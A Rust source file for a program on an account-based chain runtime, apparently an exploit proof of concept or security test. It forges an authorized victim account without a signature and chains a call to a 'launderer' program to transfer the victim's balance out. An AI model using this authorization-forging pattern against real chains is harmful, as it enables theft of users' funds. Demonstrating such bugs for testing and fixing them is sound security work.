use lee_core::{
    account::{Account, AccountId, AccountWithMetadata, Data, Nonce},
    program::{
        ChainedCall, ProgramId, ProgramInput, ProgramOutput, read_lee_inputs,
    },
};

/// Instruction is a flat tuple of primitives, borsh-encoded.
///
/// Fields:
///   `p2_id`:                  program ID of the launderer (P2)
///   `auth_transfer_id`:       program ID of `authenticated_transfer`, forwarded to P2
///   `victim_id_raw`:          raw `[u8; 32]` of the victim `AccountId`
///   `victim_balance`:         victim's current balance
///   `victim_nonce`:           victim's current nonce (inner `u128`)
///   `victim_slot`:            slot key holding the victim's balance
///   `recipient_id_raw`:       raw `[u8; 32]` of the recipient `AccountId`
///   `amount`:                 balance to transfer out of the victim.
type Instruction = (
    ProgramId,
    ProgramId,
    [u8; 32],
    u128,
    u128,
    ProgramId,
    [u8; 32],
    u128,
);

fn main() {
    let (
        ProgramInput {
            self_program_id,
            caller_program_id,
            pre_states,
            instruction:
                (
                    p2_id,
                    auth_transfer_id,
                    victim_id_raw,
                    victim_balance,
                    victim_nonce,
                    victim_slot,
                    recipient_id_raw,
                    amount,
                ),
        },
        instruction_data,
    ) = read_lee_inputs::<Instruction>();

    // Echo own pre_states (attacker's account) unchanged.
    let post_states = pre_states
        .iter()
        .map(|p| p.account.clone())
        .collect();

    // Construct victim AccountWithMetadata from primitives, stamping is_authorized=true.
    // Victim has not signed anything — this flag is forged entirely by P1's logic.
    let victim = AccountWithMetadata {
        account: Account::single(victim_slot, victim_balance, Data::default(), Nonce(victim_nonce)),
        is_authorized: true,
        account_id: AccountId::new(victim_id_raw),
    };

    let recipient = AccountWithMetadata {
        account: Account::single(auth_transfer_id, 0, Data::default(), Nonce(0)),
        is_authorized: false,
        account_id: AccountId::new(recipient_id_raw),
    };

    // Forward auth_transfer_id and amount to P2 so it can call authenticated_transfer.
    let p2_instruction =
        borsh::to_vec(&(auth_transfer_id, amount)).expect("serialization is infallible");

    ProgramOutput::new(
        self_program_id,
        caller_program_id,
        instruction_data,
        pre_states,
        post_states,
    )
    .with_chained_calls(vec![ChainedCall {
        program_id: p2_id,
        pre_states: vec![victim, recipient],
        instruction_data: p2_instruction,
    }])
    .write();
}
